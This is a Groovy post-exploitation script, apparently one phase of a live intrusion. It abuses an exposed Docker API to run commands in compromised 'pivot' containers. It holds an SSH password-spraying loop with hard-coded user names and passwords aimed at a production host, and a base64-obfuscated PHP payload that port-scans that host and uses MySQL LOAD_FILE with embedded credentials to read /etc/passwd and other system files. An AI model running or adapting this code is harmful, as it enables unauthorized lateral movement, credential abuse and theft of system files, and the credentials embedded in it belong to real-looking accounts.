// Phase 11b: Try pivot03 for SSH + microdnf in pivot02 + PHP socket SSH
dockerApi = "http://172.27.140.148:4243"

def httpPost(String urlStr, String jsonBody) {
    def conn = (HttpURLConnection) new URL(urlStr).openConnection()
    conn.setRequestMethod("POST")
    conn.setDoOutput(true)
    conn.setConnectTimeout(10000)
    conn.setReadTimeout(120000)
    conn.setRequestProperty("Content-Type", "application/json")
    if (jsonBody != null) conn.getOutputStream().write(jsonBody.getBytes("UTF-8"))
    def code = conn.getResponseCode()
    def body = (code >= 400 ? conn.getErrorStream()?.getText("UTF-8") : conn.getInputStream().getText("UTF-8"))
    conn.disconnect()
    return [code: code, body: body]
}

def execIn(String cid, String cmd) {
    def createBody = '{"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["/bin/bash","-c",' + groovy.json.JsonOutput.toJson(cmd) + ']}'
    def r1 = httpPost(dockerApi + "/containers/" + cid + "/exec", createBody)
    if (r1.code != 201) { return "EXEC_CREATE_FAIL HTTP " + r1.code + ": " + r1.body }
    def execId = new groovy.json.JsonSlurper().parseText(r1.body).Id
    def r2 = httpPost(dockerApi + "/exec/" + execId + "/start", '{"Detach":false,"Tty":true}')
    return r2.body
}

// Try pivot03 (JNLP slave - may have more tools)
println "===== PIVOT03 TOOLS CHECK ====="
println execIn("3b389d5bf116", "which ssh sshpass mysql nc ncat curl wget python python3 2>/dev/null; rpm -qa 2>/dev/null | grep -iE 'ssh|mysql' | head -10; cat /etc/redhat-release 2>/dev/null")

println ""
println "===== PIVOT02: Package manager ====="
println execIn("5b32e909c295", "which microdnf dnf rpm 2>/dev/null; cat /etc/redhat-release 2>/dev/null; rpm -qa 2>/dev/null | grep ssh | head -5")

println ""
println "===== PIVOT02: Python/Perl check ====="
println execIn("5b32e909c295", "which python python3 perl 2>/dev/null; python --version 2>&1; python3 --version 2>&1; perl -v 2>&1 | head -3")

println ""
println "===== PIVOT02: Try curl/wget SSH alternative ====="
println execIn("5b32e909c295", "which curl wget nc ncat socat 2>/dev/null; curl --version 2>&1 | head -2")

println ""
println "===== PIVOT03: SSH spray to PROD ====="
def result = execIn("3b389d5bf116", """
if command -v ssh &>/dev/null; then
    echo "SSH AVAILABLE"
    # Try SSH with password via sshpass or expect
    if command -v sshpass &>/dev/null; then
        echo "SSHPASS AVAILABLE"
        for user in root eduardo.cruz roman.guevara jenkins deploy; do
            for pass in 'xwMyIxfkZZaDNkFg' 'JenkisLegasy25' 'e6LBqIkOI\$PR1XX2oia' 'dtvV50vwfGq5CO9'; do
                result=\$(sshpass -p "\$pass" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 \$user@172.27.141.24 'id; hostname' 2>&1)
                if [ \$? -eq 0 ]; then
                    echo "*** SSH_OK *** \$user:\$pass -> \$result"
                    break 2
                fi
            done
        done
    else
        echo "NO SSHPASS - trying expect"
    fi
else
    echo "NO SSH IN PIVOT03"
fi
""")
println result

println ""
println "===== DEV SEARS (172.27.141.6) SSH BANNER GRAB ====="
// Use PHP raw socket to grab MySQL banner from PROD on different ports
def php = '''<?php
// Check if PROD is reachable on any other port from this host
$ports_to_check = array(22, 80, 443, 8080, 8443, 3306, 3308, 9200, 27017, 6379, 5432);
echo "=== PROD SEARS 172.27.141.24 PORT SCAN ===\\n";
foreach ($ports_to_check as $p) {
    $start = microtime(true);
    $fp = @fsockopen("172.27.141.24", $p, $en, $es, 2);
    $elapsed = round((microtime(true) - $start) * 1000);
    if ($fp) {
        stream_set_timeout($fp, 2);
        $banner = @fgets($fp, 256);
        echo "OPEN|172.27.141.24:$p|${elapsed}ms|banner=".trim($banner)."\\n";
        fclose($fp);
    } else {
        if ($elapsed > 1500) { echo "TIMEOUT|172.27.141.24:$p|${elapsed}ms\\n"; }
        else { echo "CLOSED|172.27.141.24:$p|${elapsed}ms|$en|$es\\n"; }
    }
}

// Also check DEV SEARS filesystem for PROD configs via MySQL
echo "\\n=== DEV SEARS (141.6) - Read sensitive configs via MySQL ===\\n";
$m = new mysqli("172.27.141.6", "apifincadodev", "1q2w3e4r5t6y", "", 3308);
if (!$m->connect_error) {
    $files = array(
        "/etc/passwd", "/etc/hosts", "/etc/hostname",
        "/UD01/mysql/data/auto.cnf",
    );
    foreach ($files as $f) {
        $r = $m->query("SELECT LOAD_FILE('".$f."') AS c");
        if ($r) {
            $row = $r->fetch_assoc();
            if ($row["c"] && strlen($row["c"]) > 0) {
                echo "\\nFILE_OK|$f|".strlen($row["c"])."\\n";
                echo substr($row["c"], 0, 1500)."\\n";
            }
        }
    }
    $m->close();
} else {
    echo "DEV_SEARS_CONNECT_FAIL\\n";
}

echo "\\nDONE\\n";
'''
def b64 = php.getBytes("UTF-8").encodeBase64().toString()
def cmd = "echo " + b64 + " | base64 -d > /tmp/_p11.php && php /tmp/_p11.php 2>&1; rm -f /tmp/_p11.php"
println execIn("5b32e909c295", cmd)
